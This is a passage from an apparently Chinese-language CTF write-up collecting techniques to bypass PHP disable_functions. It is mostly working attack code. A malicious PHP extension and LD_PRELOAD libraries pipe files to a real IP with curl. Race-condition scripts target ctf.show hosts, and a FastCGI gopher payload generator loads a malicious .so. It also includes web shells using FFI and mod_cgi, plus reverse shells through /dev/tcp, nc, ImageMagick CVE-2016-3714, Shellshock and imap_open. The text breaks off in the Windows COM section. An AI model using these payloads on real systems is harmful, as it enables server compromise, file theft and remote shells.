unable to   |\n   | obtain it through the world-wide-web, please send a note to          |\n   | license@php.net so we can mail you a copy immediately.               |\n   +----------------------------------------------------------------------+\n   | Author:  |\n   +----------------------------------------------------------------------+\n*/\n\n#ifdef HAVE_CONFIG_H\n# include \"config.h\"\n#endif\n\n#include \"stdlib.h\"\n#include \"php.h\"\n#include \"ext/standard/info.h\"\n#include \"php_backdoor.h\"\n\n/* For compatibility with older PHP versions */\n#ifndef ZEND_PARSE_PARAMETERS_NONE\n#define ZEND_PARSE_PARAMETERS_NONE() \\\n        ZEND_PARSE_PARAMETERS_START(0, 0) \\\n        ZEND_PARSE_PARAMETERS_END()\n#endif\n\n/* {{{ void backdoor_test1()\n */\nPHP_FUNCTION(ctfshow)\n{\n        ZEND_PARSE_PARAMETERS_NONE();\n        system(\"curl http://47.99.77.52:6666/?s=`cat /*`\");\n}\n/* }}} */\n\n/* {{{ string backdoor_test2( [ string $var ] )\n */\nPHP_FUNCTION(backdoor_test2)\n{\n        char *var = \"World\";\n        size_t var_len = sizeof(\"World\") - 1;\n        zend_string *retval;\n\n        ZEND_PARSE_PARAMETERS_START(0, 1)\n                Z_PARAM_OPTIONAL\n                Z_PARAM_STRING(var, var_len)\n        ZEND_PARSE_PARAMETERS_END();\n\n        retval = strpprintf(0, \"Hello %s\", var);\n\n        RETURN_STR(retval);\n}\n/* }}}*/\n\n/* {{{ PHP_RINIT_FUNCTION\n */\nPHP_RINIT_FUNCTION(backdoor)\n{\n#if defined(ZTS) && defined(COMPILE_DL_BACKDOOR)\n        ZEND_TSRMLS_CACHE_UPDATE();\n#endif\n\n        return SUCCESS;\n}\n/* }}} */\n\n/* {{{ PHP_MINFO_FUNCTION\n */\nPHP_MINFO_FUNCTION(backdoor)\n{\n        php_info_print_table_start();\n        php_info_print_table_header(2, \"backdoor support\", \"enabled\");\n        php_info_print_table_end();\n}\n/* }}} */\n\n/* {{{ arginfo\n */\nZEND_BEGIN_ARG_INFO(arginfo_backdoor_test1, 0)\nZEND_END_ARG_INFO()\n\nZEND_BEGIN_ARG_INFO(arginfo_backdoor_test2, 0)\n        ZEND_ARG_INFO(0, str)\nZEND_END_ARG_INFO()\n/* }}} */\n\n/* {{{ backdoor_functions[]\n */\nstatic const zend_function_entry backdoor_functions[] = {\n        PHP_FE(ctfshow,         arginfo_backdoor_test1)\n        PHP_FE(backdoor_test2,          arginfo_backdoor_test2)\n        PHP_FE_END\n};\n/* }}} */\n\n/* {{{ backdoor_module_entry\n */\nzend_module_entry backdoor_module_entry = {\n        STANDARD_MODULE_HEADER,\n        \"backdoor\",                                     /* Extension name */\n        backdoor_functions,                     /* zend_function_entry */\n        NULL,                                                   /* PHP_MINIT - Module initialization */\n        NULL,                                                   /* PHP_MSHUTDOWN - Module shutdown */\n        PHP_RINIT(backdoor),                    /* PHP_RINIT - Request initialization */\n        NULL,                                                   /* PHP_RSHUTDOWN - Request shutdown */\n        PHP_MINFO(backdoor),                    /* PHP_MINFO - Module info */\n        PHP_BACKDOOR_VERSION,           /* Version */\n        STANDARD_MODULE_PROPERTIES\n};\n/* }}} */\n\n#ifdef COMPILE_DL_BACKDOOR\n# ifdef ZTS\nZEND_TSRMLS_CACHE_DEFINE()\n# endif\nZEND_GET_MODULE(backdoor)\n#endif\n```\n\n然后编译\n\n```bash\nphpize\n./configure\nmake\nmake install\n```\n\n就会在modules目录下生成.so文件，然后将生成的恶意文件上传或写入到目标的扩展目录，使用`php -r`调用，就能执行自定义的命令了\n\n\n注意，如果制作so的环境的php版本于靶机的php版本不同，则可能会产生如下错误\n\n```bash\nWarning: PHP Startup: backdoor: Unable to initialize module\nModule compiled with module API=20190902\nPHP    compiled with module API=20180731\nThese options need to match\n in Unknown on line 0\n\nDeprecated: Directive 'track_errors' is deprecated in Unknown on line 0\n\nFatal error: Uncaught Error: Call to undefined function ctfshow() in Command line code:1\nStack trace:\n#0 {main}\n  thrown in Command line code on line 1\n```\n\n这时候需要修改`/usr/include/php/20190902/Zend/zend_modules.h`(具体路径可能不一致)文件中的`ZEND_MODULE_API_NO`的值为上面报错中的值`20180731`\n\n然后编译\n\n```bash\nmake clean\nphpize\n./configure\nmake && make install\n```\n\n\n\n\n# 利用 LD_PRELOAD 环境变量\n\n>LD_PRELOAD 是 Linux 系统中的一个环境变量，它可以影响程序的运行时的链接（Runtime linker），它允许你定义在程序运行前优先加载的动态链接库。\n\n总的来说就是通过LD_PRELOAD指定的动态链接库文件，会在其它文件调用之前先被调用，借此可以达到劫持的效果\n\n需要的条件如下\n\n1. 创建的恶意so文件可以上传到目标主机\n2. 能够控制 LD_PRELOAD 环境变量的值，比如 putenv() 函数\n3. 需要通过某个可以创建新进程的函数来加载 LD_PRELOAD 中的 .so 文件，比如 mail()、imap_mail()、mb_send_mail() 和 error_log() 函数等\n\n\n## 劫持系统函数\n\n在php中启动新进程时会自动调用许多的函数和api等等，其中 getuid 函数来确认进程属主(执行权限）\n\n通过`man 2 getuid`查看函数原型\n\n可以发现没有参数并且很常用，符合劫持函数的要求\n\n```text\nGETUID(2)                                                        Linux Programmer's Manual                                                        GETUID(2)\n\nNAME\n       getuid, geteuid - get user identity\n\nSYNOPSIS\n       #include <unistd.h>\n       #include <sys/types.h>\n\n       uid_t getuid(void);\n       uid_t geteuid(void);\n\nDESCRIPTION\n       getuid() returns the real user ID of the calling process.\n\n       geteuid() returns the effective user ID of the calling process.\n\nERRORS\n       These functions are always successful.\n```\n\n劫持getuid\n\n```c\n#include <stdlib.h>\n#include <stdio.h>\n#include <string.h>\nvoid payload(){\n        system(\"curl http://url:port?s=`cat /*`\");\n}\nint getuid()\n{\n        if(getenv(\"LD_PRELOAD\")==NULL){ return 0;}\n        unsetenv(\"LD_PRELOAD\");\n        payload();\n}\n```\n\n生成动态链接库\n\n`gcc -c -fPIC hack.c -o hack && gcc --share hack -o hack.so`\n\n\n将 hack.so 上传并通过环境变量 LD_PRELOAD 指定后，只要新建进程，就会执行我们的恶意代码\n\nphp中部分可以新建进程的函数如下\n\n```php\nsystem\nshell_exec\nexec\npassthru\nproc_open\npopen\npcntl\nmail\nimap_mail\nmb_send_mail\nerror_log\nlibvirt_connect\ngnupg_init\nimagick\n```\n\n还可以通过`strace -f php 1.php 2>&1 | grep execve`命令来查看是否创建了新的进程\n\n![](/img/summary/disable_functions-1.png)\n\n\n\n## 劫持启动进程\n\n但是某些函数并不会调用getuid或者被禁用，这时候就需要更加通用的方式，不局限于劫持某一函数\n\n在 GCC 中有个 C 语言扩展修饰符 \\_\\_attribute\\_\\_((constructor))，可以让由它修饰的函数在 main() 之前执行，若它出现在共享对象中时，那么一旦共享对象被系统加载，立即将执行 \\_\\_attribute\\_\\_((constructor)) 修饰的函数\n\n\n```C\n#define _GNU_SOURCE\n#include <stdlib.h>\n#include <string.h>\n\nextern char** environ;\n__attribute__ ((__constructor__)) void preload (void)\n{\n    int i;\n    for (i = 0; environ[i]; ++i) {\n            if (strstr(environ[i], \"LD_PRELOAD\")) {\n                    environ[i][0] = '\\0';\n            }\n    }\n    system(\"curl http://url:port?s=`cat /*`\");\n}\n```\n\n编译\n\n`gcc -c -fPIC hack.c -o hack && gcc --share hack -o hack.so`\n\n\n## 无上传点时的利用姿势\n\n当没有表面上的上传点时可以考虑利用临时文件\n\n**一：php的临时文件**\n\n\nphp的临时文件一般在`/tmp`目录下，如果可以列目录看到文件名的话可以考虑利用，否则很难爆破文件名\n\n\n**二：nginx的body缓存机制**\n\n如果传输的数据大于16k，则nginx会缓存。虽然说nginx会保存文件，但是nginx会在转发给php-fpm后就删除掉了(在php解释执行之前)\n\n这就不能直接利用了，需要用到linux的一个特性：`/proc/PID/fd/{1}`去读取（条件是php和nginx的执行用户名是相同的才可以访问）\n\n\n一个例子\n\n```python\nimport re\nimport socket\nimport threading\n\nip = 'pwn.challenge.ctf.show'\nport = 28268\ns = socket.socket()\ns.connect((ip, port))\n\n\n# 获取当前进程的pid\ns.send(f'''GET / HTTP/1.1\nHost:127.0.0.1\n\n\t'''.encode())\ndata = s.recv(1024).decode()\ns.close()\npid = re.findall('(.*?) www-data', data)[0].strip()\nprint(\"pid:\", pid)\n\n\n# payload\npayload = \"curl http://47.99.77.52:8888?a=`cat /f*`;\" + '0' * 1024 * 500\nlength = len(payload)\n\n\n# 上传文件\ndef upload():\n    while True:\n        s = socket.socket()\n        s.connect((ip, port))\n        x = f'''POST / HTTP/1.1\nHost: 127.0.0.1\nContent-Length: {length}\nContent-Type: application/x-www-form-urlencoded\nConnection: close\n\n{payload}\n'''.encode()\n        s.send(x)\n        s.close()\n\n\n# 读取文件\ndef bruter():\n    while True:\n        for fd in range(3, 40):\n            print(\"fd:\", fd)\n            s = socket.socket()\n            s.connect((ip, port))\n            s.send(f'''GET /?file=/proc/{pid}/fd/{fd} HTTP/1.1\nHost: 127.0.0.1\nConnection: close\n\n'''.encode())\n            print(s.recv(2048).decode())\n            s.close()\n\n\nfor i in range(30):\n    t = threading.Thread(target=upload)\n    t.start()\nfor j in range(30):\n    a = threading.Thread(target=bruter)\n    a.start()\n\n```\n\n\n**三：nginx的body缓存机制+恶意so文件**\n\n\n与二类似，只不过将命令换成了so文件\n\n```python\nimport re\nimport socket\nimport threading\n\nip = 'pwn.challenge.ctf.show'\nport = 28128\ns = socket.socket()\ns.connect((ip, port))\n\n# 获取当前进程的pid\ns.send(f'''GET / HTTP/1.1\nHost:127.0.0.1\n\n\t'''.encode())\ndata = s.recv(1024).decode()\ns.close()\npid = re.findall('(.*?) www-data', data)[0].strip()\nprint(\"pid:\", pid)\n\n# payload length\nlength = str(len(open('hack.so', 'rb').read() + b'\\n' * 1024 * 200)).encode()\n\n\n# 上传文件\ndef upload():\n    while True:\n        s = socket.socket()\n        s.connect((ip, port))\n        x = b'''POST / HTTP/1.1\nHost: 127.0.0.1\nContent-Length: ''' + length + b'''\nContent-Type: application/x-www-form-urlencoded\nConnection: close\n\n''' + open('hack.so', 'rb').read() + b'\\n' * 1024 * 200 + b'''\n\n'''\n        s.send(x)\n        s.close()\n\n\n# 读取文件\ndef bruter():\n    while True:\n        for fd in range(3, 40):\n            print(\"fd:\", fd)\n            s = socket.socket()\n            s.connect((ip, port))\n            s.send(f'''GET /?env=LD_PRELOAD=/proc/{pid}/fd/{fd} HTTP/1.1\nHost: 127.0.0.1\nConnection: close\n\n'''.encode())\n            print(s.recv(2048).decode())\n            s.close()\n\n\nfor i in range(30):\n    t = threading.Thread(target=upload)\n    t.start()\nfor j in range(30):\n    a = threading.Thread(target=bruter)\n    a.start()\n```\n\n\n\n\n# 加载so绕过disable_functions\n\n原理与 LD_PRELOAD 绕过的方式差不多，一个是通过 putenv 设置，另一个则是通过上传一个恶意so文件，然后通过 PHP_VALUE 给 php.ini 添加一个 extender 扩展来绕过\n\n\n制作恶意so文件\n\n```c\n#define _GNU_SOURCE\n#include <stdlib.h>\n#include <string.h>\n\nextern char** environ;\n__attribute__ ((__constructor__)) void preload (void)\n{\n    int i;\n    for (i = 0; environ[i]; ++i) {\n            if (strstr(environ[i], \"LD_PRELOAD\")) {\n                    environ[i][0] = '\\0';\n            }\n    }\n    system(\"bash -c 'exec bash -i &>/dev/tcp/IP/PORT <&1'\");\n}\n```\n\n编译\n\n`gcc -c -fPIC hack.c -o hack && gcc --share hack -o hack.so`\n\n以下是修改过的 [https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75](https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75)，可以生成payload，注意修改 PHP_VALUE 的内容\n\n```python\nimport socket\nimport random\nimport argparse\nimport sys\nfrom io import BytesIO\n\n# 修改点 1\nfrom urllib.parse import quote\n\n# Referrer: https://github.com/wuyunfeng/Python-FastCGI-Client\n\nPY2 = True if sys.version_info.major == 2 else False\n\n\ndef bchr(i):\n    if PY2:\n        return force_bytes(chr(i))\n    else:\n        return bytes([i])\n\n\ndef bord(c):\n    if isinstance(c, int):\n        return c\n    else:\n        return ord(c)\n\n\ndef force_bytes(s):\n    if isinstance(s, bytes):\n        return s\n    else:\n        return s.encode('utf-8', 'strict')\n\n\ndef force_text(s):\n    if issubclass(type(s), str):\n        return s\n    if isinstance(s, bytes):\n        s = str(s, 'utf-8', 'strict')\n    else:\n        s = str(s)\n    return s\n\n\nclass FastCGIClient:\n    \"\"\"A Fast-CGI Client for Python\"\"\"\n\n    # private\n    __FCGI_VERSION = 1\n\n    __FCGI_ROLE_RESPONDER = 1\n    __FCGI_ROLE_AUTHORIZER = 2\n    __FCGI_ROLE_FILTER = 3\n\n    __FCGI_TYPE_BEGIN = 1\n    __FCGI_TYPE_ABORT = 2\n    __FCGI_TYPE_END = 3\n    __FCGI_TYPE_PARAMS = 4\n    __FCGI_TYPE_STDIN = 5\n    __FCGI_TYPE_STDOUT = 6\n    __FCGI_TYPE_STDERR = 7\n    __FCGI_TYPE_DATA = 8\n    __FCGI_TYPE_GETVALUES = 9\n    __FCGI_TYPE_GETVALUES_RESULT = 10\n    __FCGI_TYPE_UNKOWNTYPE = 11\n\n    __FCGI_HEADER_SIZE = 8\n\n    # request state\n    FCGI_STATE_SEND = 1\n    FCGI_STATE_ERROR = 2\n    FCGI_STATE_SUCCESS = 3\n\n    def __init__(self, host, port, timeout, keepalive):\n        self.host = host\n        self.port = port\n        self.timeout = timeout\n        if keepalive:\n            self.keepalive = 1\n        else:\n            self.keepalive = 0\n        self.sock = None\n        self.requests = dict()\n\n    def __connect(self):\n        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        self.sock.settimeout(self.timeout)\n        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n        # if self.keepalive:\n        #     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 1)\n        # else:\n        #     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 0)\n\n        # 修改点 2\n        # try:\n        #     self.sock.connect((self.host, int(self.port)))\n        # except socket.error as msg:\n        #     self.sock.close()\n        #     self.sock = None\n        #     print(repr(msg))\n        #     return False\n        return True\n\n    def __encodeFastCGIRecord(self, fcgi_type, content, requestid):\n        length = len(content)\n        buf = bchr(FastCGIClient.__FCGI_VERSION) \\\n              + bchr(fcgi_type) \\\n              + bchr((requestid >> 8) & 0xFF) \\\n              + bchr(requestid & 0xFF) \\\n              + bchr((length >> 8) & 0xFF) \\\n              + bchr(length & 0xFF) \\\n              + bchr(0) \\\n              + bchr(0) \\\n              + content\n        return buf\n\n    def __encodeNameValueParams(self, name, value):\n        nLen = len(name)\n        vLen = len(value)\n        record = b''\n        if nLen < 128:\n            record += bchr(nLen)\n        else:\n            record += bchr((nLen >> 24) | 0x80) \\\n                      + bchr((nLen >> 16) & 0xFF) \\\n                      + bchr((nLen >> 8) & 0xFF) \\\n                      + bchr(nLen & 0xFF)\n        if vLen < 128:\n            record += bchr(vLen)\n        else:\n            record += bchr((vLen >> 24) | 0x80) \\\n                      + bchr((vLen >> 16) & 0xFF) \\\n                      + bchr((vLen >> 8) & 0xFF) \\\n                      + bchr(vLen & 0xFF)\n        return record + name + value\n\n    def __decodeFastCGIHeader(self, stream):\n        header = dict()\n        header['version'] = bord(stream[0])\n        header['type'] = bord(stream[1])\n        header['requestId'] = (bord(stream[2]) << 8) + bord(stream[3])\n        header['contentLength'] = (bord(stream[4]) << 8) + bord(stream[5])\n        header['paddingLength'] = bord(stream[6])\n        header['reserved'] = bord(stream[7])\n        return header\n\n    def __decodeFastCGIRecord(self, buffer):\n        header = buffer.read(int(self.__FCGI_HEADER_SIZE))\n\n        if not header:\n            return False\n        else:\n            record = self.__decodeFastCGIHeader(header)\n            record['content'] = b''\n\n            if 'contentLength' in record.keys():\n                contentLength = int(record['contentLength'])\n                record['content'] += buffer.read(contentLength)\n            if 'paddingLength' in record.keys():\n                skiped = buffer.read(int(record['paddingLength']))\n            return record\n\n    def request(self, nameValuePairs={}, post=''):\n        if not self.__connect():\n            print('connect failure! please check your fasctcgi-server !!')\n            return\n\n        requestId = random.randint(1, (1 << 16) - 1)\n        self.requests[requestId] = dict()\n        request = b\"\"\n        beginFCGIRecordContent = bchr(0) \\\n                                 + bchr(FastCGIClient.__FCGI_ROLE_RESPONDER) \\\n                                 + bchr(self.keepalive) \\\n                                 + bchr(0) * 5\n        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_BEGIN,\n                                              beginFCGIRecordContent, requestId)\n        paramsRecord = b''\n        if nameValuePairs:\n            for (name, value) in nameValuePairs.items():\n                name = force_bytes(name)\n                value = force_bytes(value)\n                paramsRecord += self.__encodeNameValueParams(name, value)\n\n        if paramsRecord:\n            request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, paramsRecord, requestId)\n        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, b'', requestId)\n\n        if post:\n            request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, force_bytes(post), requestId)\n        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, b'', requestId)\n\n        # 修改点 3\n        # self.sock.send(request)\n        # self.requests[requestId]['state'] = FastCGIClient.FCGI_STATE_SEND\n        # self.requests[requestId]['response'] = b''\n        # return self.__waitForResponse(requestId)\n        return request\n\n    def __waitForResponse(self, requestId):\n        data = b''\n        while True:\n            buf = self.sock.recv(512)\n            if not len(buf):\n                break\n            data += buf\n\n        data = BytesIO(data)\n        while True:\n            response = self.__decodeFastCGIRecord(data)\n            if not response:\n                break\n            if response['type'] == FastCGIClient.__FCGI_TYPE_STDOUT \\\n                    or response['type'] == FastCGIClient.__FCGI_TYPE_STDERR:\n                if response['type'] == FastCGIClient.__FCGI_TYPE_STDERR:\n                    self.requests['state'] = FastCGIClient.FCGI_STATE_ERROR\n                if requestId == int(response['requestId']):\n                    self.requests[requestId]['response'] += response['content']\n            if response['type'] == FastCGIClient.FCGI_STATE_SUCCESS:\n                self.requests[requestId]\n        return self.requests[requestId]['response']\n\n    def __repr__(self):\n        return \"fastcgi connect host:{} port:{}\".format(self.host, self.port)\n\n\nif __name__ == '__main__':\n    parser = argparse.ArgumentParser(description='Php-fpm code execution vulnerability client.')\n    parser.add_argument('host', help='Target host, such as 127.0.0.1')\n    parser.add_argument('file', help='A php file absolute path, such as /usr/local/lib/php/System.php')\n    parser.add_argument('-c', '--code', help='What php code your want to execute', default='<?php phpinfo(); exit; ?>')\n    parser.add_argument('-p', '--port', help='FastCGI port', default=9000, type=int)\n\n    args = parser.parse_args()\n\n    client = FastCGIClient(args.host, args.port, 3, 0)\n    params = dict()\n    documentRoot = \"/\"\n    uri = args.file\n    content = args.code\n    params = {\n        'GATEWAY_INTERFACE': 'FastCGI/1.0',\n        'REQUEST_METHOD': 'POST',\n        'SCRIPT_FILENAME': documentRoot + uri.lstrip('/'),\n        'SCRIPT_NAME': uri,\n        'QUERY_STRING': '',\n        'REQUEST_URI': uri,\n        'DOCUMENT_ROOT': documentRoot,\n        'SERVER_SOFTWARE': 'php/fcgiclient',\n        'REMOTE_ADDR': '127.0.0.1',\n        'REMOTE_PORT': '9985',\n        'SERVER_ADDR': '127.0.0.1',\n        'SERVER_PORT': '80',\n        'SERVER_NAME': \"localhost\",\n        'SERVER_PROTOCOL': 'HTTP/1.1',\n        'CONTENT_TYPE': 'application/text',\n        'CONTENT_LENGTH': \"%d\" % len(content),\n        'PHP_VALUE': 'unserialize_callback_func = system\\nextension_dir = /tmp\\nextension = hack.so\\ndisable_classes = \\ndisable_functions = \\nallow_url_include = On\\nopen_basedir = /\\nauto_prepend_file = ',\n        'PHP_ADMIN_VALUE': 'allow_url_include = On'\n    }\n    # 修改点 4\n    # response = client.request(params, content)\n    # print(force_text(response))\n    request_ssrf = quote(client.request(params, content))\n    print(\"gopher://127.0.0.1:\" + str(args.port) + \"/_\" + request_ssrf)\n\n```\n\n用法和原来一样\n\n`python fpm.py 127.0.0.1 -p 9001 /var/www/html/add_api.php -c \"<?php phpinfo(); ?>\"`\n\n\n\n# Apache_mod_cgi\n\n**利用条件**\n- Linux 操作系统\n- Apache + PHP (apache 使用 apache_mod_php)\n- Apache 开启了 cgi, rewrite\n- httpd.conf 中给了Web目录 AllowOverride 权限（允许.htaccess文件）\n- 当前目录可写\n\n**原理**\n\nApache 在配置开启 CGI 后可以用 ScriptAlias 指令指定一个目录，指定的目录下面便可以存放可执行的 CGI 程序。若是想临时允许一个目录可以执行 CGI 程序并且使得服务器将自定义的后缀解析为 CGI 程序执行，则可以在目的目录下使用 htaccess 文件进行配置，如下：\n\n```\nOptions +ExecCGI\nAddHandler cgi-script .xxx\n```\n\n这样便会将当前目录下的所有的 .xxx 文件当做 CGI 程序执行了。由于 CGI 程序可以执行命令，那我们可以利用 CGI 来执行系统命令绕过 disable_functions\n\n**利用**\n\n1：在web目录新建一个 .htaccess 文件\n\n```\nOptions +ExecCGI\nAddHandler cgi-script .xxx\n```\n\n2：然后新建一个后缀为 .xxx 的文件，内容是要执行的命令，然后赋予777权限\n\n注意：linux中cgi比较严格，如果上传后发现状态码500，无法解析文件。可能是因为本地编辑器编写上传时编码不一致导致无法解析\n\n```sh\n#!/bin/sh\necho&&cd \"/var/www/html\";ls -al\n```\n\n3：最后网页访问即可\n\n如果命令执行失败，页面也会报 500 错误(因为访问的是 CGI)\n\n\n**综合利用脚本**\n\n```php\n<?php\n$cmd = \"nc -c '/bin/bash' 172.16.15.1 4444\"; //command to be executed\n$shellfile = \"#!/bin/bash\\n\"; //using a shellscript\n$shellfile .= \"echo -ne \\\"Content-Type: text/html\\\\n\\\\n\\\"\\n\"; //header is needed, otherwise a 500 error is thrown when there is output\n$shellfile .= \"$cmd\"; //executing $cmd\nfunction checkEnabled($text, $condition, $yes, $no) //this surely can be shorter\n{\n\techo \"$text: \" . ($condition ? $yes : $no) . \"<br>\\n\";\n}\nif (!isset($_GET['checked'])) {\n\t@file_put_contents('.htaccess', \"\\nSetEnv HTACCESS on\", FILE_APPEND); //Append it to a .htaccess file to see whether .htaccess is allowed\n\theader('Location: ' . $_SERVER['PHP_SELF'] . '?checked=true'); //execute the script again to see if the htaccess test worked\n} else {\n\t$modcgi = in_array('mod_cgi', apache_get_modules()); // mod_cgi enabled?\n\t$writable = is_writable('.'); //current dir writable?\n\t$htaccess = !empty($_SERVER['HTACCESS']); //htaccess enabled?\n\tcheckEnabled(\"Mod-Cgi enabled\", $modcgi, \"Yes\", \"No\");\n\tcheckEnabled(\"Is writable\", $writable, \"Yes\", \"No\");\n\tcheckEnabled(\"htaccess working\", $htaccess, \"Yes\", \"No\");\n\tif (!($modcgi && $writable && $htaccess)) {\n\t\techo \"Error. All of the above must be true for the script to work!\"; //abort if not\n\t} else {\n\t\tcheckEnabled(\"Backing up .htaccess\", copy(\".htaccess\", \".htaccess.bak\"), \"Suceeded! Saved in .htaccess.bak\", \"Failed!\"); //make a backup, cause you never know.\n\t\tcheckEnabled(\"Write .htaccess file\", file_put_contents('.htaccess', \"Options +ExecCGI\\nAddHandler cgi-script .dizzle\"), \"Succeeded!\", \"Failed!\"); //.dizzle is a nice extension\n\t\tcheckEnabled(\"Write shell file\", file_put_contents('shell.dizzle', $shellfile), \"Succeeded!\", \"Failed!\"); //write the file\n\t\tcheckEnabled(\"Chmod 777\", chmod(\"shell.dizzle\", 0777), \"Succeeded!\", \"Failed!\"); //rwx\n\t\techo \"Executing the script now. Check your listener <img src = 'shell.dizzle' style = 'display:none;'>\"; //call the script\n\t}\n}\n?>\n```\n\n\n# php74_FFI\n\n**利用条件**\n- Linux 操作系统\n- PHP >= 7.4\n- 开启了 FFI 扩展且 ffi.enable=true\n\n\n**原理**\n\nFFI（Foreign Function Interface），即外部函数接口，允许从用户区调用C代码。简单地说，就是一项让你在PHP里能够调用C代码的技术\n\n通过c语言的system去执行命令,绕过php的disable_functions\n\n\n**利用**\n\nC库的system函数执行是没有回显的，所以需要将执行结果写入到tmp等有权限的目录中\n\n```php\n<?php\n$cmd=$_GET['cmd'];\n$ffi = FFI::cdef(\"int system(const char *command);\");\n$ffi->system(\"$cmd > /tmp/SD\");\necho file_get_contents(\"/tmp/SD\");\n@unlink(\"/tmp/SD\");\n?>\n```\n\n或者调用popen和fgetc\n\n```php\n<?php\n$cmd=$_GET['cmd'];\n$ffi = FFI::cdef(\"void *popen(char*,char*);void pclose(void*);int fgetc(void*);\",\"libc.so.6\");\n$o = $ffi->popen(\"$cmd\",\"r\");\n$d = \"\";while(($c = $ffi->fgetc($o)) != -1){$d .= str_pad(strval(dechex($c)),2,\"0\",0);}\n$ffi->pclose($o);\necho hex2bin($d);\n```\n\n又或者调用PHP源码中的函数\n\n```php\n<?php\n$cmd=$_GET['cmd'];\n$ffi = FFI::cdef(\"int php_exec(int type, char *cmd);\");\n$ffi->php_exec(3,\"$cmd\");   //3表示passthru()函数，其执行命令可以直接将结果原始输出\n```\n\n\n\n# ImageMagick(CVE-2016–3714)\n\n\n**利用条件**\n- 漏洞影响ImageMagick 6.9.3-9以前的所有版本\n- 安装了 php-imagick 拓展并在 php.ini 中启用\n- 编写 php 通过 new Imagick 对象的方式来处理图片等格式文件\n- PHP >= 5.4\n\n\n**原理**\n\n[https://imagetragick.com/](https://imagetragick.com/)\n[https://www.leavesongs.com/PENETRATION/CVE-2016-3714-ImageMagick.html](https://www.leavesongs.com/PENETRATION/CVE-2016-3714-ImageMagick.html)\n\n简单来说就是ImageMagick有一个功能叫做delegate（委托），作用是调用外部的lib来处理文件。而调用外部lib的过程是使用系统的system命令来执行的\n\n同时它内部定义了很多占位符，而在其中command的位置，%i和%l等占位符被拼接在命令行中。这个漏洞也因此而来，被拼接完毕的命令行传入了系统的system函数，而我们只需使用反引号（`）或闭合双引号，来执行任意命令\n\n\n**利用**\n\n反弹shell\n\n```php\n<?php\necho \"Disable Functions: \" . ini_get('disable_functions') . \"\\n\";\n\nfunction AAAA(){\n$exploit = <<<EOF\npush graphic-context\nviewbox 0 0 640 480\nfill 'url(https://127.0.0.0/oops.jpg?`echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzQ3Ljk5Ljc3LjUyLzg4ODggMD4mMQ== | base64 -d | bash`\"||id \" )'\npop graphic-context\nEOF;\n\nfile_put_contents(\"KKKK.mvg\", $exploit);\n$thumb = new Imagick();\n$thumb->readImage('KKKK.mvg');\n$thumb->writeImage('KKKK.png');\n$thumb->clear();\n$thumb->destroy();\nunlink(\"KKKK.mvg\");\nunlink(\"KKKK.png\");\n}\nAAAA();\n?>\n```\n\n执行命令\n\n```php\n<?php\necho \"Disable functions: \" . ini_get(\"disable_functions\") . \"\\n\";\n$command = isset($_GET['cmd']) ? $_GET['cmd'] : 'id';\necho \"Run command: $command\\n====================\\n\";\n\n$data_file = tempnam('/tmp', 'img');\n$imagick_file = tempnam('/tmp', 'img');\n\n$exploit = <<<EOF\npush graphic-context\nviewbox 0 0 640 480\nfill 'url(https://127.0.0.1/image.jpg\"|$command>$data_file\")'\npop graphic-context\nEOF;\n\nfile_put_contents(\"$imagick_file\", $exploit);\n$thumb = new Imagick();\n$thumb->readImage(\"$imagick_file\");\n$thumb->writeImage(tempnam('/tmp', 'img'));\n$thumb->clear();\n$thumb->destroy();\n\necho file_get_contents($data_file);\n?>\n```\n\n\n\n# Bash Shellshock(CVE-2014-6271)\n\n**利用条件**\n- 目标环境存在Bash破壳（CVE-2014-6271）漏洞\n- putenv()、mail() 或 error_log() 函数可用\n\n**利用**\n\n需要利用 PHP 中可以调用 popen 或其他能够派生 bash 子进程的函数\n\n```php\n<?php\nfunction runcmd($c){\n  $d = dirname($_SERVER[\"SCRIPT_FILENAME\"]);\n  if(substr($d, 0, 1) == \"/\" && function_exists('putenv') && (function_exists('error_log') || function_exists('mail'))){\n    if(strstr(readlink(\"/bin/sh\"), \"bash\")!=FALSE){\n      $tmp=tempnam(sys_get_temp_dir(), 'as');\n      putenv(\"PHP_LOL=() { x; }; $c >$tmp 2>&1\");\n      if (function_exists('error_log')) {\n        error_log(\"a\", 1);\n      }else{\n        mail(\"a@127.0.0.1\", \"\", \"\", \"-bv\");\n      }\n    }else{\n      print(\"Not vuln (not bash)\\n\");\n    }\n    $output = @file_get_contents($tmp);\n    @unlink($tmp);\n    if($output!=\"\"){\n      print($output);\n    }else{\n      print(\"No output, or not vuln.\");\n    }\n  }else{\n    print(\"不满足使用条件\");\n  }\n}\n\n// runcmd(\"whoami\"); // 要执行的命令\nruncmd($_REQUEST[\"cmd\"]); // ?cmd=whoami\n?>\n```\n\n\n# imap_open()绕过 (CVE-2018-19518)\n\n**利用条件**\n- PHP 安装 imap 模块\n\n\n**原理**\n\nphp imap扩展用于在PHP中执行邮件收发操作。其imap_open函数会调用rsh来连接远程shell，而debian/ubuntu中默认使用ssh来代替rsh的功能（也就是说，在debian系列系统中，执行rsh命令实际执行的是ssh命令）\n\nssh命令中可以通过设置`-oProxyCommand=`来调用第三方命令，攻击者通过注入注入这个参数，最终将导致命令执行漏洞。\n即使是ssh连接失败了，但是命令还是能执行。\n\n\n**利用**\n\n```php\n<?php\n$payload = \"/bin/bash -i >& /dev/tcp/47.99.77.52/8888 0>&1\";\n$base64 = base64_encode($payload);\n$server = \"any -oProxyCommand=echo\\t{$base64}|base64\\t-d|bash\";\n@imap_open(\"{\".$server.\"}:143/imap}INBOX\",\"\",\"\") or die(\"\\n\\nError: \".imap_last_error());;\n```\n\n\n# Windows组件COM绕过\n\n**利用条件**\n- com.allow_dcom = true\n- extension=php_com_dotnet.dll\n- php>5.4\n- 目标服务器为Windows系统\n\n\n**利用**\n\n```php\n<?php\n$wsh = isset($_GET['wsh']) ? $_GET['wsh'] : 'wscript';\nif($wsh == 